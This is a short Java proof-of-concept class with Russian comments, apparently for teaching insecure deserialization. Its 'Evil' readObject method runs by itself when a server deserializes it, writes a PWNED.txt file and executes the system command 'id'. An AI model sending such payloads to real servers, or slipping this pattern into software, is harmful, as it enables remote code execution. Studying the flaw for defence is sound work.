import java.io.*;
// "Злой" объект. Ничего военного — просто Serializable. Вся соль в readObject:
// при ДЕсериализации Java сама вызывает этот метод, и здесь выполняется код АТАКУЮЩЕГО.
public class Evil implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            // доказательство 1: создаём файл на СЕРВЕРЕ
            FileWriter w = new FileWriter("PWNED.txt");
            w.write("Этот файл создал код, присланный клиентом. Это и есть RCE.\n");
            w.close();
            // доказательство 2: выполняем произвольную системную команду на СЕРВЕРЕ
            Process p = Runtime.getRuntime().exec(new String[]{"id"});
            String out = new String(p.getInputStream().readAllBytes()).trim();
            System.out.println("  [!!!] СЕРВЕР ВЫПОЛНИЛ КОМАНДУ АТАКУЮЩЕГО:  id  ->  " + out);
        } catch (Exception e) { System.out.println("  payload err: " + e); }
    }
}
